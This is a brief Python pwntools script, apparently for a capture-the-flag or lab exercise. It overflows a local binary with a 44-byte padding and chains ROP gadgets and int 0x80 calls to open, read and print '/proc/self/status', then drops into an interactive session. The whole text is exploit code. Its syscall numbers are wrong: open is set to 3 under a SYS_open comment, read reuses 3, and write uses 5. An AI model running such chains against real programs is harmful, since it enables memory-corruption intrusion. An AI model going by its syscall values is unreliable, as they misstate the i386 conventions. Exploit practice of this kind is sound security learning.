from pwn import *

p = process('./target')

offset = 44

# Addresses of the gadgets
pop_eax = 0x0804896d
pop_ebx = 0x08048575
pop_ecx_edx = 0x08048974
int_80 = 0x0804897b

# Address to store the string '/proc/self/status' in memory
file_path_addr = 0x08049499
data_section_address = 0x0804c060


payload = b'A' * offset

# ROP chain to open("/proc/self/status")
payload += p32(pop_eax) + p32(3)  # SYS_open (eax = 3)
payload += p32(pop_ebx) + p32(file_path_addr)
payload += p32(pop_ecx_edx) + p32(0) + p32(0)  # Flags (ecx = 0)
payload += p32(int_80)

# ROP chain to read(fd, buf, size)
payload += p32(pop_eax) + p32(3)  # SYS_read (eax = 3)
payload += p32(pop_ebx) + p32(3)
payload += p32(pop_ecx_edx) + p32(data_section_address) + p32(100)
payload += p32(int_80)

# ROP chain to write(1, buf, size)
payload += p32(pop_eax) + p32(5)  # SYS_write (eax = 5)
payload += p32(pop_ebx) + p32(1)
payload += p32(pop_ecx_edx) + p32(data_section_address) + p32(100)
payload += p32(int_80)

print("Sending payload..........")
p.sendline(payload)

p.interactive()
